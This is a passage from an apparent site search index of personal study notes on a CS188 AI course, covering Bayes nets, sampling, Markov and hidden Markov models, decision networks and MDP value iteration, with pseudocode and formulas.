Function\uff09\uff0c\u7528\u4e8e\u63cf\u8ff0\u8fde\u7eed\u968f\u673a\u53d8\u91cf\u5728\u67d0\u4e2a\u7279\u5b9a\u503c\u9644\u8fd1\u7684\u76f8\u5bf9\u53ef\u80fd\u6027\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/11-Bayesian_Network_Intro/","title":"11 Bayesian Network Intro","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/11-Bayesian_Network_Intro/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/11-Bayesian_Network_Intro/#bayesian-network-representation","title":"Bayesian Network Representation","text":"<p>If IBE used, each of n variables we wish to represent can take on d possible values (it has a domain of size d), then our joint distribution table will have \\(d^n\\) entries, exponential in the number of variables and quite impractical to store!</p> <p>Bayes nets avoid this issue by taking advantage of the idea of conditional probability.</p> <p>Bayes Net</p> <p>We formally define a Bayes Net as consisting of: </p> <p>example: </p>","tags":["notes","cs188"]},{"location":"note/cs188/note/11-Bayesian_Network_Intro/#structure-of-bayes-nets","title":"Structure of Bayes Nets","text":"<p>Two rules for Bayes Net independences</p> <ul> <li>Each node is conditionally independent of all its ancestor nodes (non-descendants) in the graph, given all of its parents.</li> <li>Each node is conditionally independent of all other variables given its Markov blanket<sup>1</sup>.</li> </ul> <p>Help</p> <p>\u8fd9\u4e24\u4e2a\u89c4\u5219\u5373\u662f\u5229\u7528\u4e86\u6761\u4ef6\u6982\u7387\u7684\u5c40\u90e8\u6027\uff0c\u5e2e\u52a9\u6211\u4eec\u5c06\u5224\u65ad\u4e00\u4e2a\u4e8b\u4ef6\u6240\u9700\u8981\u8003\u8651\u7684\u5176\u4ed6\u4e8b\u4ef6\u7684\u6570\u91cf\u5927\u5927\u51cf\u5c11\u3002</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/11-Bayesian_Network_Intro/#link","title":"link","text":"<ul> <li>cs188-sp24-note11 </li> </ul> <ol> <li> <p>A variable\u2019s Markov blanket consists of parents, children, children\u2019s other parents.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/12-Variable_Elimination/","title":"12 Variable Elimination","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/12-Variable_Elimination/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/12-Variable_Elimination/#variable-elimination","title":"variable elimination","text":"<p>An alternate approach is to eliminate hidden variables one by one. To eliminate a variable X, we:  1. Join (multiply together) all factors<sup>1</sup> involving X.  2. Sum out X.</p> variable elimination<pre><code>def elimination_ask(X, e, bn):\n    \"\"\"\n    Returns a distribution over X given evidence e using variable elimination.\n\n    Parameters:\n    X: Query variable\n    e: Observed values for evidence variables\n    bn: Bayesian network specifying joint distribution P(X1, ..., Xn)\n\n    Returns:\n    Normalized distribution over X\n    \"\"\"\n    factors = []  # Initialize an empty list for factors\n    for var in order(bn.VARS):  # Iterate over variables in a specified order\n        factors = make_factor(var, e, factors)  # Create a factor for the current variable\n        if var is a hidden variable:  # Check if the variable is hidden\n            factors = sum_out(var, factors)  # Sum out the hidden variable from factors\n    return normalize(pointwise_product(factors))  # Normalize the final distribution\n</code></pre> <p>Example</p> <pre><code>graph LR\n   T ---&gt; A\n   T ---&gt; B\n   A ---&gt; C\n   B ---&gt; C</code></pre> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/12-Variable_Elimination/#ibe-vs-ve","title":"IBE vs. VE","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/12-Variable_Elimination/#link","title":"link","text":"<ul> <li>cs188-sp24-note12 </li> </ul> <ol> <li> <p>A factor is defined simply as an unnormalized probability\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/","title":"13 Approximate Inference","text":"<p>An alternate approach for probabilistic reasoning is to implicitly calculate the probabilities for our query by simply counting samples. This will not yield the exact solution, as in IBE or Variable Elimination, but this approximate inference is often good enough, especially when taking into account massive savings in computation.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#prior-sampling","title":"Prior Sampling","text":"<p>Given a Bayes Net model, we can easily write a simulator. For example, consider the CPTs given below for the simplified model with only two variables T and C. We call this simple approach prior sampling. </p> <p></p> prior sampling<pre><code>import random\n\ndef get_t():\n    if random.random() &lt; 0.99:\n        return True\n    return False\n\ndef get_c(t):\n    if t and random.random() &lt; 0.95:\n        return True\n    return False\n\ndef get_sample():\n    t = get_t()\n    c = get_c(t)\n    return [t, c]\n</code></pre> <p>The downside of this approach is that it may require the generation of a very large number of samples in order to perform analysis of unlikely scenarios. If we wanted to compute P(C| \u2212t), we\u2019d have to throw away 99% of our samples.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#rejection-sampling","title":"Rejection Sampling","text":"<p>One way to mitigate the previously stated problem is to modify our procedure to early reject any sample inconsistent with our evidence. Namly if we want to generate P(C|-t), we don't generate c if T=+t so we can throw most of bad samples to faster generating. </p>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#likelihood-weighting","title":"Likelihood weighting","text":"<p>A more exotic approach is likelihood weighting, which ensures that we never generate a bad sample. In this approach, we manually set all variables equal to the evidence in our query.</p> <p>For example, if we wanted to compute P(C|\u2212t), we\u2019d simply declare that t is false. The problem here is that this may yield samples that are inconsistent with the correct distribution. If we simply force some variables to be equal to the evidence, then our samples occur with probability only equal to the products of the CPTs of the non-evidence variables. This means the joint PDF has no guarantee of being correct (though may be for some cases like our two variable Bayes Net).</p> <p>Likelihood weighting solves this issue by using a weight for each sample, which is the probability of the evidence variables given the sampled variables.</p> Likelihood weighting<pre><code>def likelihood_weighting(X, e, bn, N):\n    \"\"\"\n    Calculate the posterior probability P(X | e) for the query variable X given evidence e.\n\n    Parameters:\n    X: Query variable\n    e: Observed values for evidence variables\n    bn: Bayesian network specifying the joint distribution P(X1, ..., Xn)\n    N: Total number of samples to be generated\n\n    Returns:\n    Normalized weight vector W\n    \"\"\"\n    W = {value: 0 for value in X.values()}  # Initialize weight vector\n\n    for j in range(N):\n        x, w = weighted_sample(bn, e)  # Generate sample and weight\n        W[x] += w  # Update weight\n\n    return normalize(W)  # Normalize weights\n\ndef weighted_sample(bn, e):\n    \"\"\"\n    Generate an event and a weight.\n\n    Parameters:\n    bn: Bayesian network\n    e: Observed values for evidence variables\n\n    Returns:\n    x: Generated event\n    w: Weight\n    \"\"\"\n    w = 1  # Initialize weight to 1\n    x = {}  # Initialize event\n\n    for Xi in bn.variables:  # Iterate over all variables\n        if Xi in e:  # If it is an evidence variable\n            w *= P(Xi | parents(Xi))  # Update weight\n            x[Xi] = e[Xi]  # Set event value to the evidence value\n        else:\n            x[Xi] = random_sample(P(Xi | parents(Xi)))  # Sample from the conditional distribution\n\n    return x, w  # Return event and weight\n\ndef normalize(W):\n    \"\"\"\n    Normalize the weight vector.\n\n    Parameters:\n    W: Weight vector\n\n    Returns:\n    Normalized weight vector\n    \"\"\"\n    total_weight = sum(W.values())\n    return {key: value / total_weight for key, value in W.items()}  # Normalize\n</code></pre> <p>For all three of our sampling methods (prior sampling, rejection sampling, and likelihod weighting), we can get increasing amounts of accuracy by generating additional samples. However, of the three, likelihood weighting is the most computationally efficient , for reasons beyond the scope of this course.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#gibbs-sampling","title":"Gibbs Sampling","text":"<p>Gibbs Sampling is a fourth approach for sampling. In this approach, we first set all variables to some totally random value (not taking into account any CPTs). We then repeatedly pick one variable at a time, clear its value, and resample it given the values currently assigned to all other variables.</p> Gibbs sampling<pre><code>def gibbs_ask(X, e, bn, N):\n    \"\"\"\n    Returns an estimate of P(X | e) using Gibbs sampling.\n\n    Parameters:\n    X: Query variable\n    e: Observed values for evidence variables\n    bn: Bayesian network\n    N: Total number of samples to be generated\n\n    Returns:\n    Normalized count vector N\n    \"\"\"\n    N = {value: 0 for value in X.values()}  # Initialize count vector for each value of X\n    Z = get_non_evidence_variables(bn)  # Get non-evidence variables in the Bayesian network\n    x = initialize_with_random_values(e, Z)  # Initialize x with random values for variables in Z\n\n    for j in range(N):  # Loop for N samples\n        for Zi in Z:  # Iterate over each non-evidence variable\n            # Set the value of Zi in x by sampling from P(Zi | mb(Zi))\n            x[Zi] = sample_from_conditional_distribution(Zi, x)  \n            N[x] += 1  # Increment the count for the current value of X\n\n    return normalize(N)  # Normalize the count vector\n</code></pre>","tags":["notes","cs188"]},{"location":"note/cs188/note/13-Approximate_Inference/#link","title":"link","text":"<ul> <li>cs188-sp24-note13 </li> <li>A Gentle Introduction to Bayesian Deep Learning</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/14-Markov_Models/","title":"14 Markov Models","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/14-Markov_Models/#note","title":"note","text":"<p>We\u2019ll now cover a very intrinsically related structure called a Markov model, which for the purposes of this course can be thought of as analogous to a chain-like, infinite-length Bayes\u2019 net. Now, we'll take a weather prediction example.</p> <p></p> \\[ P(W_0,W_1,...,W_n)=P(W_0)P(W_1|W_0)P(W_2|W_1)...P(W_n|W_{n-1})=P(W_0)\\prod_{i=0}^{n-1}P(W_{i+1}|W_i) \\] <p>To track how our quantity under consideration (in this case, the weather) changes over time, we need to know both it\u2019s initial distribution at time t = 0 and some sort of transition model that characterizes the probability of moving from one state to another between timesteps.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/14-Markov_Models/#mini-forward-algothrim","title":"mini-forward algothrim","text":"<p>By properties of marginalization, we know that:</p> \\[ P(W_{i+1})=\\sum_{w_i}P(w_i,W_{i+1}) \\overset{\\text{chain rule}}{\\implies} P(W_{i+1})=\\sum_{w_i}P(W_{i+1}|w_i)P(w_i) \\] <p>To compute the distribution of the weather at timestep i+1, we look at the probability distribution at timestep i given by \\(P(W_i)\\) and \"advance\" this model a timestep with our transition model \\(P(W_{i+1}|W_i)\\).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/14-Markov_Models/#stationary-distribution","title":"Stationary Distribution","text":"<p>A new question: does the probability of being in a state at a given timestep ever converge?</p> <p>To solve this problem, we must compute the stationary distribution of the weather. As the name suggests, the stationary distribution is one that remains the same after the passage of time, i.e. \\(P(W_{i+1})=P(W_{i})\\).</p> <p>So we have \\(P(W_{t})=\\sum_{w_{t}}P(W_{t+1}|w_{t})P(w_{t})\\), in our weather forecast, that is:</p> \\[ \\begin{cases} P(W_t=sun)=P(W_{t+1}=sun|W_t=sun)P(W_t=sun)+P(W_{t+1}=sun|W_t=rain)P(W_t=rain)  \\\\ P(W_t=rain)=P(W_{t+1}=rain|W_t=sun)P(W_t=sun)+P(W_{t+1}=rain|W_t=rain)P(W_t=rain) \\end{cases} \\] <p>Since we know \\(P(w_{t+1}|w_{t})\\) (namly the transition model), then we can solve binary first order equations and get \\(P(W_{t})\\).</p> <p>As expected, \\(P(W_{\\infty+1}) = P(W_{\\infty})\\). In general, if \\(W_{t}\\) had a domain of size k, the equivalence \\(P(W_{t})=\\sum_{w_{t}}P(W_{t+1}|w_{t})P(w_{t})\\) yields a system of k equations, which we can use to solve for the stationary distribution.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/14-Markov_Models/#link","title":"link","text":"<ul> <li>cs188-sp24-note14 </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/","title":"15 Hidden Marko Models","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/#note","title":"note","text":"<p>We may collect new meteorological evidence that might affect our belief of the probability distribution in the process of predicting what the weather will be like on a given day from the initial state.</p> <p>Hidden Markov Model (HMM) allows us to observe some evidence at each timestep, which can potentially affect the belief distribution at each of the states. Compared to the Markov model, the Hidden Markov model requires not only the initial distribution, the transition model, but also the sensor model.</p> <p></p> <p>To make distinction, we\u2019ll call each \\(W_i\\) a state variable and each weather forecast \\(F_i\\) an evidence variable.</p> <p>The model implies similar conditional indepencence relationships as standard Markov models, with an additional set of relationships for the evidence variables<sup>1</sup>:</p> \\[ \\begin{aligned}&amp;F_{1}\\quad\\perp\\!\\!\\!\\perp\\quad W_{0}|W_{1}\\\\&amp; \\forall i\\quad=\\quad2,\\ldots,n;\\quad W_{i}\\perp\\!\\!\\!\\perp v\\{W_{0},\\ldots,W_{i-2},F_{1},\\ldots,F_{i-1}\\}|W_{i-1}\\\\&amp; \\forall i\\quad=\\quad2,\\ldots,n;\\quad F_{i}\\perp\\!\\!\\!\\perp\\{W_{0},\\ldots,W_{i-1},F_{1},\\ldots,F_{i-1}\\}|W_{i}\\end{aligned} \\] <p>Just like Markov models, Hidden Markov Models make the assumption that the transition model \\(P(W_{i+1}|W_i)\\) is stationary. Hidden Markov Models make the additional simplifying assumption that the sensor model \\(P(F_i|W_i)\\) is stationary as well.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/#notation","title":"notation","text":"<ul> <li>\\(e_{i}\\) : evidence observed at timestep i<ul> <li>\\(e_{1:t} := e_{1}, e_{2} \\dots e_{t}\\)</li> </ul> </li> <li>\\(B(W_{i})=P(W_{i}|f_{1},\\dots f_{t})=P(W_{i}|f_{1:t})\\) : the belief distribution at time i with all evidence \\(F1,\\dots,Fi\\) observed up to date<ul> <li>\\(B'(W_{i})=P(W_{i}|f_{1},\\dots f_{t-1})=P(W_{i}|f_{1:(t-1)})\\) : the belief distribution at time i with evidence \\(f_{1},\\dots, f_{i\u22121}\\) observed.</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/#forward-algothrim","title":"Forward Algothrim","text":"<p>Noting that \\(B^{\\prime}(W_{i+1})=P(W_{i+1}|f_1,\\ldots,f_i)=\\sum_{w_i}P(W_{i+1}|w_i,f_1,\\ldots,f_i)P(w_i|f_1,\\ldots,f_i)\\) and \\(W_{i+1} \\perp\\!\\!\\!\\perp f_{1: i} | W_{i}\\), we can easily get: \\(\\boxed{B^{\\prime}(W_{i+1})=\\sum_{{w_{i}}}P(W_{i+1}|w_{i})B(w_{i})}\\).</p> <p>After some derivation (see original note), we get: \\(B(W_{i+1})\\propto P(f_{i+1}|W_{i+1})B^{\\prime}(W_{i+1})\\) , so we get \\(B(W_{i+1}) \\sim B(W_{i})\\).</p> <p>\u6839\u636e\u539f\u7b14\u8bb0\uff0c\u6211\u8ba4\u4e3a\u5e94\u5f53\u662f\uff1a\\(\\boxed{B(W_{i+1}) =  \\frac{P(f_{i+1}|W_{i+1})\\sum_{{w_{i}}}P(W_{i+1}|w_{i})B(w_{i})}{P(f_{i+1}|f_{1:i})}}\\) \uff0c\u8fd9\u5c31\u662f hidden marko model's forward algorithm.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/#viterbi-algorithm","title":"Viterbi Algorithm","text":"<p>The problem can also be solved for using dynamic programming with the Viterbi algorithm. To visualize the algorithm, consider the following state trellis, a graph of states and transitions over time:</p> <p></p> <p>In this HMM with two possible hidden states, sun or rain, we would like to compute the highest probability path (assignment of a state for every timestep) from \\(X_1\\) to \\(X_N\\).</p> <p>The weights on an edge from \\(X_{t\u22121}\\) to \\(X_t\\) is equal to \\(P(X_t | X_{t\u22121})P(E_t | X_t)\\)<sup>2</sup>, and the probability of a path is computed by taking the product of its edge weights. </p> <p>If \\(P(X_{1}|X_{0}) := P(X_{1})\\), we have \\(P(X_{1:N}, e_{1:N}) = \\prod_{t=1}^NP(X_t|X_{t-1})P(e_t|X_t)\\). In the Viberbi Algothrim, we want to compute \\(\\arg\\max_{x_1,..,x_N}P(x_{1:N},e_{1:N})\\) to find the maximum likelihood estimate of the sequence of hidden states.</p> <p>The algorithm consists of two passes:  - the first runs forward in time and computes the probability of the best path to each (state, time) tuple given the evidence observed so far.  - The second pass runs backwards in time: first it finds the terminal state that lies on the path with the highest probability, and then traverses backward through time along the path that leads into this state (which must be the best path).</p> <p>Define \\(m_{t}[x_{t}] =\\max_{x_{1}:t-1}P(x_{1:t}, e_{1: t})\\), so we get:</p> \\[ \\begin{aligned}m_t[x_t]&amp;=\\max_{x_{1:t-1}}P(e_t|x_t)P(x_t|x_{t-1})P(x_{1:t-1},e_{1:t-1})\\\\&amp;=P(e_t|x_t)\\max_{x_{t-1}}P(x_t|x_{t-1})\\max_{x_{1:t-2}}P(x_{1:t-1},e_{1:t-1})\\\\&amp;=P(e_t|x_t)\\max_{x_{t-1}}P(x_t|x_{t-1})m_{t-1}[x_{t-1}].\\end{aligned} \\] <p>Using \\(a_t[x_t]=P(e_t|x_t)\\arg\\max_{x_{t-1}}P(x_t|x_{t-1})m_{t-1}[x_{t-1}]=\\arg\\max_{x_{t-1}}P(x_t|x_{t-1})m_{t-1}[x_{t-1}]\\)to keep track of the last transition, the pseudo-code is as follows:</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/15-Hidden_Marko_Models/#link","title":"link","text":"<ul> <li>cs188-sp24-note15 </li> </ul> <ol> <li> <p>\u8868\u8fbe\u5f0f\u00a0A\u2aebB\u2223C\u00a0\u8868\u793a\u5728\u7ed9\u5b9a\u6761\u4ef6\u00a0C\u00a0\u7684\u60c5\u51b5\u4e0b\uff0c\u53d8\u91cf\u00a0A\u00a0\u548c\u00a0B\u00a0\u662f\u76f8\u4e92\u72ec\u7acb\u7684\u00a0\u21a9</p> </li> <li> <p>The first term in the weight formula represents how likely a particular transition is and the second term represents how well the observed evidence fits the resulting state.\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/","title":"16 PF DN VPI","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#particle-filtering","title":"Particle Filtering","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#introduction","title":"Introduction","text":"<p>Hidden Markov Models have the same drawback as bayes net - the time it takes to run exact inference with the forward algorithm scales with the number of values in the domains of the random variables.</p> <p>The Hidden Markov Model analog to Bayes\u2019 net sampling is called particle filtering, and involves simulating the motion of a set of particles through a state graph to approximate the probability (belief) distribution of the random variable in question. Our belief that a particle is in any given state at any given timestep is dependent entirely on the number of particles in that state at that timestep in our simulation. To recover a belief distribution from a particle list, all you need to do is count the number of particles and normalize them.</p> <p>This solves the same question as the Forward Algorithm: it gives us an approximation of \\(P(X_{N}|e_{1:N})\\) .</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#simulation","title":"Simulation","text":"<ul> <li>Particle Initialization</li> <li>Time Elapse Update - Update the value of each particle according to the transition model.</li> <li>Observation Update - During the observation update for particle filtering, we use the sensor model \\(P(F_{i}|T_{i})\\) to weight each particle according to the probability dictated by the observed evidence and the particle\u2019s state.<ul> <li></li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#utilities","title":"Utilities","text":"<p>Rational agents must follow the principle of maximum utility - they must always select the action that maximizes their expected utility. However, obeying this principle only benefits agents that have rational preferences.</p> <p>The mathematical language of preferences:</p> <ul> <li>If an agent prefers receiving a prize A to receiving a prize B, this is written \\(A \\succ B\\) . </li> <li>If an agent is indifferent between receiving A or B, this is written as \\(A \\sim B\\)</li> <li>A lottery is a situation with different prizes resulting with different probabilities. To denote lottery where A is received with probability p and B is received with probability (1\u2212 p), we write \\(L = [p, A; (1-p), B]\\).</li> </ul> <p>In order for a set of preferences to be rational, they must follow the five Axioms of Rationality: - Orderability: \\((A\\succ B)\\lor(B\\succ A)\\lor(A\\sim B)\\) - Transitivity: \\((A\\succ B)\\land(B\\succ C)\\Rightarrow(A\\succ C)\\) - Continuity: \\(A\\succ B\\succ C\\Rightarrow\\exists p, \\left[p,A;(1-p),C\\right]\\sim B\\) - Substitutability: \\(A\\sim B\\Rightarrow[p,A;(1-p),C]\\sim[p,B;(1-p),C]\\) - Monotonicity: \\(A\\succ B\\Rightarrow(p\\geq q\\Leftrightarrow[p,A;\\mathrm{~(1-p),B]\\succeq[q,A;~(1-q),B]}\\)</p> <p>If all five axioms are satisfied by an agent, there exists a real-valued utility function U that: \\(\\begin{array}{rcl}U(A)\\geq U(B)&amp;\\Leftrightarrow&amp;A\\succeq B&amp;\\text{(1)}\\\\U([p_1,S_1;\\ldots;p_n,S_n])&amp;=&amp;\\sum_ip_iU(S_i)&amp;(2)\\end{array}\\) , examples omitted here.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#decision-network","title":"Decision Network","text":"<p>Now we\u2019ll discuss a combination of both Bayes\u2019 nets and expectimax known as a decision network that we can use to model the effect of various actions on utilities based on an overarching graphical probabilistic model.</p> <p>In decision network: - Chance node (ovals)     - Chance nodes in a decision network behave identically to Bayes\u2019 nets. - Action node (rectangles)     - Action nodes are nodes that we have complete control over. - Utility node (diamonds)     - Utility nodes are children of some combination of action and chance nodes.</p> <p>Example</p> <p>Let's say we're deciding whether or not to bring an umbrella </p> <p>Our goal with decision networks is again to select the action which yields the maximum expected utility(MEU), and the expected utility of taking an action a given evidence e and n chance nodes is computed with </p> \\[EU(a|e)=\\sum_{x_1,...,x_n}P(x_1,...,x_n|e)U(a,x_1,...,x_n)\\] <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#the-value-of-perfect-information-vpi","title":"The Value of Perfect Information (VPI)","text":"<p>We\u2019ve generally always assumed that our agent has all the information it needs for a particular problem and/or has no way to acquire new information. In practice, this is hardly the case, and one of the most important parts of decision making is knowing whether or not it\u2019s worth gathering more evidence to help decide which action to take.</p> <p>In this section, we\u2019ll talk about a very important concept - the value of perfect information (VPI) - which mathematically quantifies the amount an agent\u2019s maximum expected utility is expected to increase if it observes some new evidence.</p> <p>Mathematically, we represent it as:</p> \\[ \\begin{cases} MEU(e)=\\max_a\\sum_sP(s|e)U(s,a) \\\\ MEU(e,e^{\\prime})=\\max_a\\sum_sP(s|e,e^{\\prime})U(s,a) \\end{cases} \\implies VPI(e^{\\prime}|e)=MEU(e,e^{\\prime})-MEU(e) \\] <p>However, note that we don\u2019t know what new evidence we\u2019ll get, we use E' to represent e', so \\(MEU(e,E^{\\prime})=\\sum_{e^{\\prime}}P(e^{\\prime}|e)MEU(e,e^{\\prime})\\) and \\(\\boxed{VPI(E^{\\prime}|e)=MEU(e,E^{\\prime})-MEU(e)}\\).</p> <p>Properties of VPI: - Nonnegativity - \\(\\forall E^{\\prime},e\\text{ VPI}(E^{\\prime}|e)\\geq0\\) - Nonadditivity - \\(VPI(E_j,E_k|e)\\neq VPI(E_j|e)+VPI(E_k|e)\\) in general. - Order-independence - \\(VPI(E_j,E_k|e)=VPI(E_j|e)+VPI(E_k|e_j)=VPI(E_k|e)+VPI(E_j|e,E_k)\\)</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/16-PF-DN-VPI/#link","title":"link","text":"<ul> <li>cs188-sp24-note16 </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/17-Markov_Decision_Processes/","title":"17 Markov Decision Processes","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/17-Markov_Decision_Processes/#note","title":"note","text":"<p>A Markov Decision Process is defined by several properties:</p> <ul> <li>a set of states S and a start state, possibly one or more terminal states.</li> <li>a set of actions A.</li> <li>a transiton function \\(T(s, a, s')\\)<ul> <li>represents the probability tha an agent taking an action \\(a \\in A\\) from state \\(s \\in S\\) end up in a state \\(s' \\in S\\).</li> </ul> </li> <li>a reward function \\(R(s, a, s')\\)<ul> <li>the agent\u2019s objective is naturally to acquire the maximum reward possible before arriving at some terminal state.</li> </ul> </li> <li>a utility function \\(U([s_{0}, a_{0}, s_{1}, a_{1}, s_{2}, \\dots])\\) for \\(s_0\\xrightarrow{a_0}s_1\\xrightarrow{a_1}s_2\\xrightarrow{a_2}s_3\\xrightarrow{a_3}...\\)<ul> <li>possibly a discount factor \\(\\gamma\\) (set 1 if not mentioned)</li> <li>\\(U([s_0,a_0,s_1,a_1,s_2,...])=R(s_0,a_0,s_1)+\\gamma R(s_1,a_1,s_2)+\\gamma^2R(s_2,a_2,s_3)+...\\)</li> </ul> </li> <li>markovianess<ul> <li>if we know the present state, knowing the past doesn\u2019t give us any more information about the future</li> <li>\\(P(S_{t+1}=s_{t+1}|S_t=s_t,A_t=a_t,...,S_0=s_0) = P(S_{t+1}=s_{t+1}|S_{t}=s_{t}, A_{t}=a_{t})\\)</li> <li>\\(T(s,a,s')=P(s'|s,a)\\)</li> </ul> </li> </ul> <p>Consider the motivating example of a racecar:</p> <p></p> <ul> <li>S = {cool, warm, overheated}</li> <li>A = {slow, fast}</li> <li></li> </ul> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/17-Markov_Decision_Processes/#finite-horizons-and-discount-factors","title":"Finite Horizons and Discount factors","text":"<p>We haven't placed any time constraints on the number of timesteps for which a race car can take actions and collect rewards. </p> <ul> <li>Finite horizons (n)<ul> <li>it essentially defines a \"lifetime\" for agents, which gives them some set number of timesteps n to accrue as much reward as they can before being automatically terminated.</li> </ul> </li> <li>Discount factors (\\(\\gamma\\))<ul> <li>if \\(\\gamma &lt; 1\\), the discounted utility won't increse indefinitely, since:</li> <li>\\(\\begin{aligned}U([s_0,s_1,s_2,...])&amp;=\\quad R(s_0,a_0,s_1)+\\gamma R(s_1,a_1,s_2)+\\gamma^2R(s_2,a_2,s_3)+...\\\\&amp;=\\quad\\sum_{t=0}^\\infty\\gamma^tR(s_t,a_t,s_{t+1})\\leq\\sum_{t=0}^\\infty\\gamma^tR_{max}=\\boxed{\\frac{R_{max}}{1-\\gamma}}\\end{aligned}\\)</li> </ul> </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/17-Markov_Decision_Processes/#solving-mdp-with-the-bellman-equation","title":"Solving MDP with the Bellman Equation","text":"<p>Solving a MDP means finding an optimal policy \\(\\pi^{*}: S \\rightarrow A\\) , a function mapping each state \\(s \\in S\\) to an action \\(a \\in A\\).</p> <p>Marko \\(U^*(s)=\\max_aQ^*(s,a)\\) v decision processes, like state-space graphs, can be unraveled into search trees. Uncertainty is modeled in these search trees with Q-states, also known as action states, essentially identical to expectimax chance nodes.</p> <p>Let's efine the equation for the optimal value of a Q-state (a.k.a. optimal Q-value): </p> <p>\\(Q^*(s,a)=\\sum_{s^{\\prime}}T(s,a,s^{\\prime})[R(s,a,s^{\\prime})+\\boldsymbol{\\gamma}U^*(s^{\\prime})]\\)</p> <p>where \\(U^*(s)=\\max_aQ^*(s,a)\\) (namly the bellman equation - the optimal value of every state \\(s \\in S\\)).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/17-Markov_Decision_Processes/#link","title":"link","text":"<ul> <li>cs188-sp24-note17 </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/","title":"18 Iteration","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#value-iteration","title":"Value Iteration","text":"<p>Considering finite horizons, The time-limited value for a state s with a time-limit of k timesteps is denoted \\(U_k(s)\\),</p> <p>Value iteration is a dynamic programming algorithm that uses an iteratively longer time limit to compute time-limited values until convergence<sup>1</sup> , operating as follows:</p> <ol> <li>\\(\\forall s \\in S\\), initialze \\(U_{0}(s)=0\\), since no actions can be taken to acquire rewards.</li> <li>repear the following update rule until convergence (B is called the Bellman operator):</li> </ol> <p>$$ \\forall s\\in S,U_{k+1}(s)\\leftarrow\\max_{a}\\sum_{s^{\\prime}}T(s,a,s^{\\prime})[R(s,a,s^{\\prime})+\\gamma U_{k}(s^{\\prime})] ~~ (or   U_{k+1} \\leftarrow BU_{k}) $$</p> <p>When convergence is reached, the Bellman equation will hold for every state: \\(\\forall s \\in S, U_{k+1}(s)=U_{k}(s) = U^*(s)\\).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#q-value-iteration","title":"Q-value Iteration","text":"<p>Q-value iteration is a dynamic programming algorithm that computes time-limited Q-values. It is described in the following equation: \\(Q_{k+1}(s,a)\\leftarrow\\sum_{s^{\\prime}}T(s,a,s^{\\prime})[R(s,a,s^{\\prime})+\\gamma\\max_{a^{\\prime}}Q_k(s^{\\prime},a^{\\prime})]\\).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#policy-iteration","title":"Policy Iteration","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#policy-extraction","title":"policy extraction","text":"\\[\\forall s\\in S,\\:\\boldsymbol{\\pi}^{*}(s)=\\underset{a}{\\operatorname*{\\operatorname*{\\operatorname*{argmax}}}}Q^{*}(s,a)=\\underset{a}{\\operatorname*{\\operatorname*{\\arg\\max}}}\\sum_{{s^{\\prime}}}T(s,a,s^{\\prime})[R(s,a,s^{\\prime})+\\boldsymbol{\\gamma}U^{*}(s^{\\prime})]\\]","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#policy-evaluation","title":"policy evaluation","text":"<p>For a policy \u03c0, policy evaluation means computing \\(U^\u03c0(s)\\) for all states s, where \\(U^\u03c0(s)\\) is expected utility of starting in state s when following \u03c0 : </p> 